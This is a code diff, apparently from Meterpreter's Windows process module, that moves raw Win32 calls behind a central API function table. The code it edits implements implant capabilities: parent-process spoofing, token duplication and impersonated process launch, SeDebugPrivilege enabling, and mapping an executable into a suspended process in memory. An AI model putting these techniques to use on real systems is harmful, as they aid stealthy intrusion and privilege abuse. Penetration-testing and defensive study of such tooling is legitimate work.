@@ -5,30 +5,6 @@
 #include "./../session.h"
 #include "in-mem-exe.h" /* include skapetastic in-mem exe exec */
 
-typedef BOOL (WINAPI *PEnumProcessModules)(HANDLE p, HMODULE *mod, DWORD cb, LPDWORD needed);
-typedef DWORD (WINAPI *PGetModuleBaseName)(HANDLE p, HMODULE mod, LPWSTR base, DWORD baseSize);
-typedef DWORD (WINAPI *PGetModuleFileNameEx)(HANDLE p, HMODULE mod, LPWSTR path, DWORD pathSize);
-
-typedef BOOL (STDMETHODCALLTYPE FAR * LPFNCREATEENVIRONMENTBLOCK)( LPVOID  *lpEnvironment, HANDLE  hToken, BOOL bInherit );
-typedef BOOL (STDMETHODCALLTYPE FAR * LPFNDESTROYENVIRONMENTBLOCK) ( LPVOID lpEnvironment );
-typedef BOOL (WINAPI * LPCREATEPROCESSWITHTOKENW)( HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
-typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
-	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
-	DWORD                        dwFlags,
-	DWORD_PTR                    Attribute,
-	PVOID                        lpValue,
-	SIZE_T                       cbSize,
-	PVOID                        lpPreviousValue,
-	PSIZE_T                      lpReturnSize
-);
-
-typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
-	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
-	DWORD                        dwAttributeCount,
-	DWORD                        dwFlags,
-	PSIZE_T                      lpSize
-);
-
 typedef struct _STARTUPINFOEXW
 {
 	STARTUPINFOW StartupInfo;
@@ -55,22 +31,22 @@ DWORD request_sys_process_attach(Remote *remote, Packet *packet)
 	dprintf("[attach]: pid %d", pid);
 	// No pid? Use current.
 	if (!pid)
-		handle = GetCurrentProcess();
+		handle = met_api->win_api.kernel32.GetCurrentProcess();
 	// Otherwise, attach.
 	else
 	{
 		BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
 		DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);
 
-		handle = OpenProcess(permission, inherit, pid);
-		dprintf("[attach] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", pid, permission, handle, GetLastError());
+		handle = met_api->win_api.kernel32.OpenProcess(permission, inherit, pid);
+		dprintf("[attach] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", pid, permission, handle, met_api->win_api.kernel32.GetLastError());
 	}
 
 	// If we have a handle, add it to the response
 	if (handle)
 		met_api->packet.add_tlv_qword(response, TLV_TYPE_HANDLE, (QWORD)handle);
 	else
-		result = GetLastError();
+		result = met_api->win_api.kernel32.GetLastError();
 
 	// Send the response packet to the requestor
 	met_api->packet.transmit_response(result, remote, response);
@@ -93,8 +69,8 @@ DWORD request_sys_process_close(Remote *remote, Packet *packet)
 
 	if (handle)
 	{
-		if (handle != GetCurrentProcess())
-			CloseHandle(handle);
+		if (handle != met_api->win_api.kernel32.GetCurrentProcess())
+			met_api->win_api.kernel32.CloseHandle(handle);
 	}
 	else
 		result = ERROR_INVALID_PARAMETER;
@@ -288,12 +264,10 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 	DWORD flags = 0, createFlags = 0, ppid = 0;
 	BOOL inherit = FALSE;
 	HANDLE token, pToken;
+	HANDLE parentHandle = NULL;
 	char * cpDesktop = NULL;
 	DWORD session = 0;
 	LPVOID pEnvironment = NULL;
-	LPFNCREATEENVIRONMENTBLOCK  lpfnCreateEnvironmentBlock  = NULL;
-	LPFNDESTROYENVIRONMENTBLOCK lpfnDestroyEnvironmentBlock = NULL;
-	HMODULE hUserEnvLib = NULL;
 	ProcessChannelContext * ctx = NULL;
 	size_t size = 0;
 
@@ -401,7 +375,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 			met_api->channel.set_type(newChannel, "process");
 
 			// Allocate the stdin and stdout pipes
-			if ((!CreatePipe(&in[0], &in[1], &sa, 0)) || (!CreatePipe(&out[0], &out[1], &sa, 0)))
+			if ((!met_api->win_api.kernel32.CreatePipe(&in[0], &in[1], &sa, 0)) || (!met_api->win_api.kernel32.CreatePipe(&out[0], &out[1], &sa, 0)))
 			{
 				met_api->channel.destroy(newChannel, NULL);
 
@@ -409,7 +383,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 				free(ctx);
 
-				result = GetLastError();
+				result = met_api->win_api.kernel32.GetLastError();
 				break;
 			}
 
@@ -445,33 +419,39 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		// Set Parent PID if provided
 		if (ppid) {
 			dprintf("[execute] PPID spoofing\n");
-			HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
-			INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
-			UPDATEPROCTHREADATTRIBUTE UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hKernel32Lib, "UpdateProcThreadAttribute");
 			BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
 			DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);
-			HANDLE handle = OpenProcess(permission, inherit, ppid);
-			dprintf("[execute] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", ppid, permission, handle, GetLastError());
-			if (
-				handle &&
-				hKernel32Lib &&
-				InitializeProcThreadAttributeList &&
-				UpdateProcThreadAttribute
-			) {
-				size_t len = 0;
-				InitializeProcThreadAttributeList(NULL, 1, 0, &len);
+			parentHandle = met_api->win_api.kernel32.OpenProcess(permission, inherit, ppid);
+			SIZE_T len = 0;
+			if (!parentHandle) {
+				result = met_api->win_api.kernel32.GetLastError();
+				break;
+			}
+
+			// Missing optional exports preserve LastError, so seed a deterministic
+			// result before using the wrapper as an availability probe.
+			met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
+			met_api->win_api.kernel32.InitializeProcThreadAttributeList(NULL, 1, 0, &len);
+			DWORD attributeError = met_api->win_api.kernel32.GetLastError();
+			dprintf("[execute] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", ppid, permission, parentHandle, attributeError);
+			if (len != 0) {
 				si.lpAttributeList = malloc(len);
-				if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &len)) {
-					dprintf("[execute] InitializeProcThreadAttributeList: [%d]\n", GetLastError());
-					result = GetLastError();
+				if (!si.lpAttributeList) {
+					result = ERROR_NOT_ENOUGH_MEMORY;
+					break;
+				}
+				if (!met_api->win_api.kernel32.InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &len)) {
+					result = met_api->win_api.kernel32.GetLastError();
+					dprintf("[execute] InitializeProcThreadAttributeList: [%d]\n", result);
 					break;
 				}
 
 				dprintf("[execute] InitializeProcThreadAttributeList\n");
 
-				if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), 0, 0)) {
-					dprintf("[execute] UpdateProcThreadAttribute: [%d]\n", GetLastError());
-					result = GetLastError();
+				met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
+				if (!met_api->win_api.kernel32.UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), 0, 0)) {
+					result = met_api->win_api.kernel32.GetLastError();
+					dprintf("[execute] UpdateProcThreadAttribute: [%d]\n", result);
 					break;
 				}
 
@@ -479,11 +459,9 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 				createFlags |= EXTENDED_STARTUPINFO_PRESENT;
 				si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
-
-				FreeLibrary(hKernel32Lib);
 			}
 			else {
-				result = GetLastError();
+				result = attributeError;
 				break;
 			}
 		}
@@ -504,47 +482,39 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 				token = remote->thread_token;
 				dprintf("[execute] using thread impersonation token");
 			}
-			else if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token))
+			else if (!met_api->win_api.advapi32.OpenThreadToken(met_api->win_api.kernel32.GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token))
 			{
-				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token);
+				met_api->win_api.advapi32.OpenProcessToken(met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ALL_ACCESS, &token);
 			}
 
 			dprintf("[execute] token is 0x%.8x", token);
 
 			// Duplicate to make primary token (try delegation first)
-			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken))
+			if (!met_api->win_api.advapi32.DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken))
 			{
-				if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken))
+				if (!met_api->win_api.advapi32.DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken))
 				{
-					result = GetLastError();
+					result = met_api->win_api.kernel32.GetLastError();
 					dprintf("[execute] failed to duplicate token 0x%.8x", result);
 					break;
 				}
 			}
 
-			hUserEnvLib = LoadLibrary("userenv.dll");
-			if (NULL != hUserEnvLib)
+			if (met_api->win_api.userenv.CreateEnvironmentBlock(&pEnvironment, pToken, FALSE))
 			{
-				lpfnCreateEnvironmentBlock = (LPFNCREATEENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, "CreateEnvironmentBlock");
-				lpfnDestroyEnvironmentBlock = (LPFNDESTROYENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, "DestroyEnvironmentBlock");
-				if (lpfnCreateEnvironmentBlock && lpfnCreateEnvironmentBlock(&pEnvironment, pToken, FALSE))
-				{
-					createFlags |= CREATE_UNICODE_ENVIRONMENT;
-					dprintf("[execute] created a duplicated environment block");
-				}
-				else
-				{
-					pEnvironment = NULL;
-				}
+				createFlags |= CREATE_UNICODE_ENVIRONMENT;
+				dprintf("[execute] created a duplicated environment block");
+			}
+			else
+			{
+				pEnvironment = NULL;
 			}
 
-			if (!CreateProcessAsUserW(pToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, pEnvironment, NULL, &si.StartupInfo, &pi))
+			if (!met_api->win_api.advapi32.CreateProcessAsUserW(pToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, pEnvironment, NULL, &si.StartupInfo, &pi))
 			{
-				LPCREATEPROCESSWITHTOKENW pCreateProcessWithTokenW = NULL;
-				HANDLE hAdvapi32 = NULL;
 				wchar_t * wcmdline = NULL;
 				wchar_t * wdesktop = NULL;
-				result = GetLastError();
+				result = met_api->win_api.kernel32.GetLastError();
 
 				// sf: If we hit an ERROR_PRIVILEGE_NOT_HELD failure we can fall back to CreateProcessWithTokenW but this is only
 				// available on 2003/Vista/2008/7. CreateProcessAsUser() seems to be just borked on some systems IMHO.
@@ -552,18 +522,6 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 				{
 					do
 					{
-						hAdvapi32 = LoadLibrary("advapi32.dll");
-						if (!hAdvapi32)
-						{
-							break;
-						}
-
-						pCreateProcessWithTokenW = (LPCREATEPROCESSWITHTOKENW)GetProcAddress(hAdvapi32, "CreateProcessWithTokenW");
-						if (!pCreateProcessWithTokenW)
-						{
-							break;
-						}
-
 						// convert the multibyte inputs to wide strings (No CreateProcessWithTokenA available unfortunatly)...
 						size = mbstowcs(NULL, commandLine, 0);
 						if (size == (size_t)-1)
@@ -585,21 +543,15 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 							}
 						}
 
-						if (!pCreateProcessWithTokenW(pToken, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, createFlags, pEnvironment, NULL, &si.StartupInfo, &pi))
+						if (!met_api->win_api.advapi32.CreateProcessWithTokenW(pToken, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, createFlags, pEnvironment, NULL, &si.StartupInfo, &pi))
 						{
-							result = GetLastError();
+							result = met_api->win_api.kernel32.GetLastError();
 							dprintf("[execute] failed to create the new process via CreateProcessWithTokenW 0x%.8x", result);
 							break;
 						}
 
 						result = ERROR_SUCCESS;
-
 					} while (0);
-
-					if (hAdvapi32)
-					{
-						FreeLibrary(hAdvapi32);
-					}
 
 					SAFE_FREE(wdesktop);
 					SAFE_FREE(wcmdline);
@@ -611,67 +563,63 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 				}
 			}
 
-			if (lpfnDestroyEnvironmentBlock && pEnvironment)
+			if (pEnvironment)
 			{
-				lpfnDestroyEnvironmentBlock(pEnvironment);
-			}
-
-			if (NULL != hUserEnvLib)
-			{
-				FreeLibrary(hUserEnvLib);
+				met_api->win_api.userenv.DestroyEnvironmentBlock(pEnvironment);
 			}
 		}
 		else if (flags & PROCESS_EXECUTE_FLAG_SESSION)
 		{
-			typedef BOOL(WINAPI * WTSQUERYUSERTOKEN)(ULONG SessionId, PHANDLE phToken);
-			WTSQUERYUSERTOKEN pWTSQueryUserToken = NULL;
 			HANDLE hToken = NULL;
-			HMODULE hWtsapi32 = NULL;
-			BOOL bSuccess = FALSE;
 			DWORD dwResult = ERROR_SUCCESS;
 
 			do
 			{
-				// Note: wtsapi32!WTSQueryUserToken is not available on NT4 or 2000 so we dynamically resolve it.
-				hWtsapi32 = LoadLibraryA("wtsapi32.dll");
-
 				session = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_SESSION);
 
-				if (session_id(GetCurrentProcessId()) == session || !hWtsapi32)
+				if (session_id(met_api->win_api.kernel32.GetCurrentProcessId()) == session)
 				{
-					if (!CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
+					if (!met_api->win_api.kernel32.CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
 					{
-						BREAK_ON_ERROR("[PROCESS] execute in self session: CreateProcessW failed");
+						dwResult = met_api->win_api.kernel32.GetLastError();
+						dprintf("[PROCESS] execute in self session: CreateProcessW failed. error=%d (0x%x)", dwResult, (ULONG_PTR)dwResult);
+						break;
 					}
 				}
 				else
 				{
-					pWTSQueryUserToken = (WTSQUERYUSERTOKEN)GetProcAddress(hWtsapi32, "WTSQueryUserToken");
-					if (!pWTSQueryUserToken)
+					met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
+					if (!met_api->win_api.wtsapi32.WTSQueryUserToken(session, &hToken))
 					{
-						BREAK_ON_ERROR("[PROCESS] execute in session: GetProcAdress WTSQueryUserToken failed");
-					}
+						dwResult = met_api->win_api.kernel32.GetLastError();
+						if (dwResult != ERROR_PROC_NOT_FOUND)
+						{
+							dprintf("[PROCESS] execute in session: WTSQueryUserToken failed. error=%d (0x%x)", dwResult, (ULONG_PTR)dwResult);
+							break;
+						}
 
-					if (!pWTSQueryUserToken(session, &hToken))
-					{
-						BREAK_ON_ERROR("[PROCESS] execute in session: WTSQueryUserToken failed");
+						// NT4/2000 do not export WTSQueryUserToken. Their historical
+						// behavior is to create the process in the current session.
+						if (!met_api->win_api.kernel32.CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
+						{
+							dwResult = met_api->win_api.kernel32.GetLastError();
+							break;
+						}
+						dwResult = ERROR_SUCCESS;
 					}
-					if (!CreateProcessAsUserW(hToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
+					else if (!met_api->win_api.advapi32.CreateProcessAsUserW(hToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
 					{
-						BREAK_ON_ERROR("[PROCESS] execute in session: CreateProcessAsUser failed");
+						dwResult = met_api->win_api.kernel32.GetLastError();
+						dprintf("[PROCESS] execute in session: CreateProcessAsUser failed. error=%d (0x%x)", dwResult, (ULONG_PTR)dwResult);
+						break;
 					}
 				}
 
 			} while (0);
 
-			if (hWtsapi32)
-			{
-				FreeLibrary(hWtsapi32);
-			}
-
 			if (hToken)
 			{
-				CloseHandle(hToken);
+				met_api->win_api.kernel32.CloseHandle(hToken);
 			}
 
 			result = dwResult;
@@ -684,9 +632,9 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		else
 		{
 			// Try to execute the process
-			if (!CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
+			if (!met_api->win_api.kernel32.CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si.StartupInfo, &pi))
 			{
-				result = GetLastError();
+				result = met_api->win_api.kernel32.GetLastError();
 				break;
 			}
 		}
@@ -703,16 +651,16 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 			//
 			if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, inMemoryData.buffer))
 			{
-				result = GetLastError();
+				result = met_api->win_api.kernel32.GetLastError();
 				break;
 			}
 
 			//
 			// Resume the thread and let it rock...
 			//
-			if (ResumeThread(pi.hThread) == (DWORD)-1)
+			if (met_api->win_api.kernel32.ResumeThread(pi.hThread) == (DWORD)-1)
 			{
-				result = GetLastError();
+				result = met_api->win_api.kernel32.GetLastError();
 				break;
 			}
 
@@ -736,7 +684,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 			met_api->packet.add_tlv_qword(response, TLV_TYPE_PROCESS_HANDLE, (QWORD)pi.hProcess);
 
-			CloseHandle(pi.hThread);
+			met_api->win_api.kernel32.CloseHandle(pi.hThread);
 		}
 
 	} while (0);
@@ -744,11 +692,15 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 	// Close the read side of stdin and the write side of stdout
 	if (in[0])
 	{
-		CloseHandle(in[0]);
+		met_api->win_api.kernel32.CloseHandle(in[0]);
 	}
 	if (out[1])
 	{
-		CloseHandle(out[1]);
+		met_api->win_api.kernel32.CloseHandle(out[1]);
+	}
+	if (parentHandle)
+	{
+		met_api->win_api.kernel32.CloseHandle(parentHandle);
 	}
 
 	// Free the command line if necessary
@@ -798,20 +750,20 @@ DWORD request_sys_process_kill(Remote *remote, Packet *packet)
 			&pidTlv) == ERROR_SUCCESS) &&
 			(pidTlv.header.length >= sizeof(DWORD)))
 	{
-		DWORD pid = ntohl(*(LPDWORD)pidTlv.buffer);
+		DWORD pid = met_api->win_api.ws2_32.ntohl(*(LPDWORD)pidTlv.buffer);
 		HANDLE h = NULL;
 
 		// Try to attach to the process
-		if (!(h = OpenProcess(PROCESS_TERMINATE, FALSE, pid)))
+		if (!(h = met_api->win_api.kernel32.OpenProcess(PROCESS_TERMINATE, FALSE, pid)))
 		{
-			result = GetLastError();
+			result = met_api->win_api.kernel32.GetLastError();
 			break;
 		}
 
-		if (!TerminateProcess(h, 0))
-			result = GetLastError();
+		if (!met_api->win_api.kernel32.TerminateProcess(h, 0))
+			result = met_api->win_api.kernel32.GetLastError();
 
-		CloseHandle(h);
+		met_api->win_api.kernel32.CloseHandle(h);
 	}
 
 	// Transmit the response
@@ -838,17 +790,17 @@ DWORD request_sys_process_get_processes( Remote * remote, Packet * packet )
 			break;
 
 		// If we can, get SeDebugPrivilege...
-		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )
+		if( met_api->win_api.advapi32.OpenProcessToken( met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )
 		{
 			TOKEN_PRIVILEGES priv = {0};
 
 			priv.PrivilegeCount           = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
-				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );
+			if( met_api->win_api.advapi32.LookupPrivilegeValueA( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
+				met_api->win_api.advapi32.AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );
 
-			CloseHandle( hToken );
+			met_api->win_api.kernel32.CloseHandle( hToken );
 		}
 
 		// First we will try to get a process list via the toolhelp API. This method gives us the most information
@@ -880,7 +832,7 @@ DWORD request_sys_process_getpid(Remote *remote, Packet *packet)
 {
 	Packet *response = met_api->packet.create_response(packet);
 
-	met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, GetCurrentProcessId());
+	met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, met_api->win_api.kernel32.GetCurrentProcessId());
 
 	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
@@ -896,12 +848,7 @@ DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
 {
 	Packet *response = met_api->packet.create_response(packet);
 
-	PEnumProcessModules enumProcessModules = NULL;
-	PGetModuleBaseName getModuleBaseName = NULL;
-	PGetModuleFileNameEx getModuleFileNameEx = NULL;
-
 	HMODULE mod;
-	HANDLE psapi = NULL;
 	HANDLE handle;
 	DWORD result = ERROR_SUCCESS;
 	DWORD needed;
@@ -925,46 +872,19 @@ DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
 			break;
 		}
 
-		// Open the process API
-		if (!(psapi = LoadLibrary("psapi")))
-		{
-			result = GetLastError();
-			break;
-		}
-
-		if (!(enumProcessModules = (PEnumProcessModules)GetProcAddress(psapi, "EnumProcessModules")))
-		{
-			result = GetLastError();
-			break;
-		}
-
-		// Try to resolve the address of GetModuleBaseNameA
-		if (!(getModuleBaseName = (PGetModuleBaseName)GetProcAddress(psapi, "GetModuleBaseNameW")))
-		{
-			result = GetLastError();
-			break;
-		}
-
-		// Try to resolve the address of GetModuleFileNameExA
-		if (!(getModuleFileNameEx = (PGetModuleFileNameEx)GetProcAddress(psapi, "GetModuleFileNameExW")))
-		{
-			result = GetLastError();
-			break;
-		}
-
 		memset(name, 0, sizeof(name));
 		memset(path, 0, sizeof(path));
 
 		// Enumerate the first module in the process and get its base name
-		if ((!enumProcessModules(handle, &mod, sizeof(mod), &needed) ||
-			 (getModuleBaseName(handle, mod, name, sizeof(name) - 1) == 0)))
+		if ((!met_api->win_api.psapi.EnumProcessModules(handle, &mod, sizeof(mod), &needed) ||
+			 (met_api->win_api.psapi.GetModuleBaseNameW(handle, mod, name, sizeof(name) - 1) == 0)))
 		{
-			result = GetLastError();
+			result = met_api->win_api.kernel32.GetLastError();
 			break;
 		}
 
 		// Try to get the process' file name
-		getModuleFileNameEx(handle, mod, path, sizeof(path) - 1);
+		met_api->win_api.psapi.GetModuleFileNameExW(handle, mod, path, sizeof(path) - 1);
 
 		// Set the process' information on the response
 		met_api->packet.add_tlv_string(response, TLV_TYPE_PROCESS_NAME, met_api->string.wchar_to_utf8(name));
@@ -974,10 +894,6 @@ DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
 
 	// Transmit the response
 	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
-
-	// Close the psapi library and clean up
-	if (psapi)
-		FreeLibrary(psapi);
 
 	return ERROR_SUCCESS;
 }
@@ -1001,8 +917,8 @@ DWORD process_channel_read(Channel *channel, Packet *request,
 	if (ctx == NULL)
 		return ERROR_SUCCESS;
 
-	if (!ReadFile(ctx->pStdout, buffer, bufferSize, bytesRead, NULL))
-		return GetLastError();
+	if (!met_api->win_api.kernel32.ReadFile(ctx->pStdout, buffer, bufferSize, bytesRead, NULL))
+		return met_api->win_api.kernel32.GetLastError();
 
 	return ERROR_SUCCESS;
 }
@@ -1023,9 +939,9 @@ DWORD process_channel_write(Channel* channel, Packet* request, LPVOID context, L
 		return result;
 	}
 
-	if (!WriteFile(ctx->pStdin, buffer, bufferSize, bytesWritten, NULL))
+	if (!met_api->win_api.kernel32.WriteFile(ctx->pStdin, buffer, bufferSize, bytesWritten, NULL))
 	{
-		result = GetLastError();
+		result = met_api->win_api.kernel32.GetLastError();
 	}
 
 	return result;
@@ -1049,8 +965,8 @@ DWORD process_channel_close( Channel *channel, Packet *request, LPVOID context )
 		dprintf( "[PROCESS] channel has an attached process, closing via scheduler signal. channel=0x%08X, ctx=0x%08X", channel, ctx );
 		met_api->scheduler.signal_waitable( ctx->pStdout, SchedulerStop );
 	} else {
-		CloseHandle( ctx->pStdin );
-		CloseHandle( ctx->pStdout );
+		met_api->win_api.kernel32.CloseHandle( ctx->pStdin );
+		met_api->win_api.kernel32.CloseHandle( ctx->pStdout );
 
 		free( ctx );
 	}
@@ -1070,12 +986,12 @@ DWORD process_channel_interact_destroy( HANDLE waitable, LPVOID entryContext, LP
 		return dwResult;
 	}
 
-	CloseHandle( ctx->pStdin );
-	CloseHandle( ctx->pStdout );
+	met_api->win_api.kernel32.CloseHandle( ctx->pStdin );
+	met_api->win_api.kernel32.CloseHandle( ctx->pStdout );
 
 	if( ctx->pProcess ) {
 		dprintf( "[PROCESS] terminating process 0x%x", ctx->pProcess );
-		TerminateProcess( ctx->pProcess, 0 );
+		met_api->win_api.kernel32.TerminateProcess( ctx->pProcess, 0 );
 	}
 
 	free( ctx );
@@ -1107,29 +1023,29 @@ DWORD process_channel_interact_notify(Remote* remote, LPVOID entryContext, LPVOI
 	}
 
 	dprintf("[PROCESS] process_channel_interact_notify: looking for stuff on the stdout pipe");
-	if (PeekNamedPipe(ctx->pStdout, NULL, 0, NULL, &bytesAvail, NULL))
+	if (met_api->win_api.kernel32.PeekNamedPipe(ctx->pStdout, NULL, 0, NULL, &bytesAvail, NULL))
 	{
 		dprintf("[PROCESS] process_channel_interact_notify: named pipe call returned, %u bytes", bytesAvail);
 		if (bytesAvail)
 		{
 			dprintf("[PROCESS] process_channel_interact_notify: attempting to read %u bytes", bytesAvail);
-			if (ReadFile(ctx->pStdout, buffer, sizeof(buffer) - 1, &bytesRead, NULL))
+			if (met_api->win_api.kernel32.ReadFile(ctx->pStdout, buffer, sizeof(buffer) - 1, &bytesRead, NULL))
 			{
 				dprintf("[PROCESS] process_channel_interact_notify: read %u bytes, passing to channel write", bytesRead);
 				return met_api->channel.write(channel, remote, NULL, 0, buffer, bytesRead, NULL);
 			}
-			result = GetLastError();
+			result = met_api->win_api.kernel32.GetLastError();
 		}
 		else
 		{
 			// sf: if no data is available on the pipe we sleep to avoid running a tight loop
 			// in this thread, as anonymous pipes won't block for data to arrive.
-			Sleep(100);
+			met_api->win_api.kernel32.Sleep(100);
 		}
 	}
 	else
 	{
-		result = GetLastError();
+		result = met_api->win_api.kernel32.GetLastError();
 	}
 
 	if (result != ERROR_SUCCESS)
@@ -1195,7 +1111,7 @@ DWORD request_sys_process_wait(Remote *remote, Packet *packet)
 
 	if( handle )
 	{
-		if( WaitForSingleObject( handle, INFINITE ) == WAIT_OBJECT_0 )
+		if( met_api->win_api.kernel32.WaitForSingleObject( handle, INFINITE ) == WAIT_OBJECT_0 )
 			result = ERROR_SUCCESS;
 	}
 
